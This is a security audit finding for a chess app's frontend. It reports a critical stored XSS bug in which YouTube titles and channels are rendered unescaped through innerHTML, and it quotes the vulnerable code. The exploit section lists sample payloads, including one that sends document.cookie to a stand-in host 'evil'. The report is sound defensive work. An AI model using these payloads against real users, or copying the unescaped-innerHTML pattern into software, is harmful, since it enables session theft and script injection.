# SEC-01 — Stored XSS in Scout results grid: unescaped YouTube title/channel/thumbnail into `innerHTML`
- **Severity:** critical
- **Type:** security
- **File:** frontend/scout.js
- **Line(s):** 463-483 (sink), 402-404 (source fetch)
- **Component:** OpeningScout.renderResults
- **Repro script:** `audit/scripts/CODE4_tree_repro.js` (logic harness; XSS path traced statically, see "Exploit")
- **Detected by:** CODE-4

## Expected
Every value originating from a remote, third-party source (a YouTube video's
title, uploader name, thumbnail URL) must be inserted with `textContent` /
`setAttribute`, or escaped, before being concatenated into an `innerHTML`
template literal. `AGENTS.md` §3 lists YouTube titles/channels as remote data.

## Actual
`renderResults()` builds the whole results grid with one `innerHTML`
template literal and interpolates unescaped server data:

```js
// frontend/scout.js:463-483
grid.innerHTML = filtered.map(item => {
    const sourceBadge = item.source_type === 'youtube' ? '<span class="scout-badge-youtube">YouTube</span>' : '<span class="scout-badge-guide">Master Guide</span>';
    const thumb = item.thumbnail || '/assets/pieces/wN.svg';
    const ecoBadge = item.eco ? `<span class="badge-eco">${item.eco}</span>` : '';
    return `
        <div class="card-panel scout-card" data-source-id="${item.id}" data-source-type="${item.source_type}">
            <div class="scout-card-thumb-wrap">
                <img src="${thumb}" alt="${item.title}" class="scout-card-thumb" onerror="this.src='/assets/pieces/wN.svg'">
                <span class="scout-card-duration">${item.duration_formatted || ''}</span>
            </div>
            <div class="scout-card-body">
                <div class="scout-card-meta">
                    ${sourceBadge}
                    ${ecoBadge}
                </div>
                <div class="scout-card-title" title="${item.title}">${item.title}</div>
                <div class="scout-card-channel">${item.channel || 'Chess Guide'}</div>
            </div>
        </div>
    `;
}).join('');
```

The data comes straight from `GET /api/scout/search`:

```js
// frontend/scout.js:402-404
const res = await fetch(`/api/scout/search?query=${encodeURIComponent(query)}&limit=12`);
const data = await res.json();
this.cachedResults = data || [];
```

and the server fills `title` / `channel` verbatim from yt-dlp metadata
(`backend/scout.py:130-131`):

```python
'title': e.get('title') or f"Chess Guide: {query}",
'channel': e.get('uploader') or e.get('channel') or "Chess Creator",
```

Note the inconsistency: the very same file uses `textContent` correctly
everywhere else (`scout.js:541`, `543`, `545`, `548`, `552`, `598`), which
proves the safe pattern was known and simply not applied to the card grid.

There is a second unescaped sink at `frontend/scout.js:409`:

```js
grid.innerHTML = `<div ...>Failed to load scout results: ${e.message}</div>`;
```

## Root cause
`innerHTML` template literals are used as a templating engine for
attacker-controllable strings with no escaping helper. The values
`item.title`, `item.channel`, `item.eco`, `item.duration_formatted` and
`item.id` are all remote.

## Exploit / escalation
1. **Outright script execution.** Anyone who can upload a YouTube video titled
   `"><img src=x onerror=alert(document.cookie)>` gets arbitrary JS executed in
   the desktop app's renderer the moment the victim searches any opening (the
   app auto-searches `Caro-Kann Defense` on load, `scout.js:192`) and the grid
   renders. `index.html:924` loads `scout.js` in the same renderer as
   `repertoire_builder.js`, so `window.videoScout`/`window.repertoireBuilder`
   and the fetched Lichess token context are reachable.
2. **Attribute breakout via `alt` / `title` / `data-source-id`.** Even a title
   of `" onmouseover="fetch('http://evil/'+document.cookie)` yields an
   attribute-context injection without needing a `<` character.
3. **`<img src="${thumb}">`**: `item.thumbnail` is server-built, but the
   ECO-guide branch returns records whose `thumbnail` key is whatever the
   server row holds (`loadRecent()` at `scout.js:428` falls back to
   `item.thumbnail_url`), so any future unvalidated `thumbnail_url` is a third
   injection sink in the same template.
4. Adjacent weaker variant: the same file's `openStudio()` *does* use
   `textContent` for `study.title` (line 541) — so patching only the card
   grid leaves the tree-line render (`SEC-02`) as the remaining path.
